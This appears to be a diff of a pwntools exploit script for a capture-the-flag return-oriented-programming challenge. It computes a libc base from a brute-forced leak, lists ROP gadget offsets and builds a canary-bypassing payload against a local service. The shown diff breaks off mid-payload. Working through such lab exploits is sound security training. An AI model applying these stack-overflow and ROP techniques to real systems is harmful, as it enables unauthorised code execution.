@@ -5,9 +5,9 @@ offset = 0x58
 s = '''
 b * challenge+108
 '''
-binary = './babyrop_level15.0'
+binary = './babyrop_level15.0_patched'
 elf = ELF(binary)
-libc = ELF('./libc.so.6')
+libc = ELF('./libc-2.31.so')
 
 
 context.binary = binary
@@ -193,59 +193,45 @@ for i in range(5):
 
 
 rip = int.from_bytes(rip, 'little')
-#elf.address = rip - 0x20a2
-print("Successfully brute-forced a libc address leak, it is: ", hex(rip))
+libc_base = rip - 0x24d09
+writable_space_base = rip + 0x1c92f7
+print("Successfully brute-forced a libc address leak, it is: ", hex(libc_base))
 
 
 # gadgets
 
-
-
-p = remote('localhost', 1337)
-gdb.attach(p, s)
-payload = flat(
-	b'A'* offset,
-	canary,
-	b'B' * 8,
-	p64(0xdeadbeef)
-)
-p.send(payload)
-
-
-p.interactive()
-
-
-
-p.recvuntil(b'Leaving!\n')
-leak = p.recv(6)  # Just receive exactly 6 bytes for the address
-leak = u64(leak.ljust(8, b'\x00'))
-libc_base = leak - libc.sym['puts']
 
 #print(hex(leak))
 #print(hex(libc_base))
 
 
 
-p.close()
 
 
 
 #essential address 
-f_string_addr = libc_base + next(libc.search(b'f\0'))
-flag_addr = elf.bss() + 100
-f_string_addr = elf.bss() + 150
+#f_string_addr = libc_base + next(libc.search(b'f\0'))
+flag_addr = writable_space_base + 100
+f_string_addr = writable_space_base + 150
 #gadgets again 
 
 
 #gadgets:
+
 pop_rdi = libc_base + 0x0000000000023b6a
-print(hex(pop_rdi))
 pop_rax = libc_base + 0x0000000000036174
 pop_rsi = libc_base + 0x000000000002601f
 pop_rdx_pop_r12_ret = libc_base + 0x0000000000119431
 syscall = libc_base + 0x00000000000630a9
 leave_ret = libc_base + 0x0578c8
+'''
 
+pop_rdi = libc_base + 0x2a205
+pop_rax = libc_base + 0x43067
+pop_rsi = libc_base + 0x2bb39
+pop_rdx = libc_base + 0x10d37d
+syscall = libc_base + 0x8ed72
+'''
 
 
 
@@ -253,11 +239,11 @@ leave_ret = libc_base + 0x0578c8
 
 
 p = remote('localhost', 1337)
-#gdb.attach(p, s)
+gdb.attach(p, s)
 
 payload = flat(
 	# read
-	b'A'*0x68,
+	b'A'*offset,
 	canary,
 	b'B'*8, # old rbp
 	
